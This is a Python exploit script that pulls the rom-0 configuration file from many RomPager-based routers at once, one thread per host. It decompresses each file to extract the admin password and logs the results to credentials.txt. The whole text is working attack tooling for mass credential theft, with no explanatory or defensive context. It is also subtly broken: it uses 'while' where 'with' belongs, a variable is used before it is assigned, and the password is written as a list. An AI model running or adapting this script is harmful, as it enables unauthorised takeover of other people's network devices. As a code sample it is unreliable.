import re
import sys
import threading
import requests

from deps.lzs_decompress import LZSDecompress

def exploit(host):
    print("Extracting rom file ...")
    response = requests.get(f"http://{host}/rom-0", verify=False)
    if response.status_code != 200:
        print("Router is not vulnerable")
        return

    print("Router is vulnerable, file extracted")
    print("Extracting router credentials ...")

    data = response.content[8568:]
    result, window = LZSDecompress(data, window)

    password = re.findall("([\040-\176]{5,})", result)
    print("Got router credentials")

    with open('credentials.txt', 'a') as f:
        f.write(f"{host} - admin:{password}")

    print("Wrote router credentials to file")

if len(sys.argv) < 2:
    print("Usage: rompager_exploit.py <hosts_file>")
    sys.exit(1)

while open(sys.argv[1], 'r') as f:
    lines = f.read().strip().split('\n')
    counter = 0
    for line in lines:
        print(f"Initializing thread #{str(counter)} ...")

        host = line.strip()
        thread = threading.Thread(target=exploit, args=[host])
        thread.start()

        print(f"Initialized thread #{str(counter)} ...")
        counter += 1
